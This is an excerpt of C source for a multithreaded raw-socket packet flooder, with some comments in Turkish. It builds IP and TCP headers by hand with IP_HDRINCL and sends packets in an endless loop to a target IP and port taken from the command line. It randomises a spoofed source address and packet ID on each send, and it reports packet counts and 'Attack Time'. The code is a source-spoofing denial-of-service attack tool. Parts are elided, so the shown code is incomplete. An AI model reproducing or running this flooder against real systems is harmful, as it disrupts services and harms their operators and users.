...
void bilgi() {
  ...
  printf("\n\n----------------------------------------------------------");
  printf("\n\nNumber of PACKETS: " YSL "%lu" RESET " \t Attack Time: " YSL
         "%.2f" RESET " second \n\n" RESET,
         p_num, time_diff);
  printf("----------------------------------------------------------\n\n");
...
void *attack(void *arg) {
  ...
  while (1) {
    ...
    if (sendto(attack_param->soket,       // our socket
               ...
               attack_param->iph->ip_len, // total size of datagram, changed
                                          // tot_len to ip_len
               0,                         // flag
    ...
    attack_param->iph->ip_src.s_addr =
        inet_addr(str); // Changed saddr to ip_src.s_addr
    attack_param->iph->ip_id =
        htons(rand()); // Paketin ID'si, changed id to ip_id
    free(str);
  }
}
...
int main(int argc, char *argv[]) {
  ...
  if (argc != 5) {
    ...
    printf(YSL
           "USAGE:" RESET
           "  %s <source port> <target IP> <target port> <threads number>\n",
           argv[0]);
    exit(0);
  }
  ...
  if (th_param.soket == -1) {
    printf(KRMZ "[-]" RESET
                " Create socket error! Error NO : %d . Error Message : %s \n",
  ...
  // TCP header
  struct tcphdr *tcph =
      (struct tcphdr *)(th_param.datagram + sizeof(struct ip));
  ...
  th_param.iph->ip_len =
      sizeof(struct ip) + sizeof(struct tcphdr); // Changed tot_len to ip_len
  ...
  th_param.iph->ip_dst.s_addr =
      th_param.sin.sin_addr.s_addr; // Assign target IP
  th_param.iph->ip_sum =
      csum((unsigned short *)th_param.datagram,
           th_param.iph->ip_len >> 1); // Changed tot_len to ip_len
  ...
  tcph->th_sum =
      0; // if you set checksum to 0, the kernel will compute it during sending
  tcph->th_urp = 0;
  ...
  tcph->th_sum =
      csum((unsigned short *)&(th_param.psh), sizeof(struct sozde_baslik));

  // IP_HDRINCL kernele headerin pakete include edildigini soyler
  int one = 1;
  const int *val = &one;
  if (setsockopt(th_param.soket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) <
      0) {
    printf(KRMZ "[-]" RESET
                " IP_HDRINCL error! Error NO : %d . Error Message : %s \n",
           errno, strerror(errno));
    exit(0);
  } else {
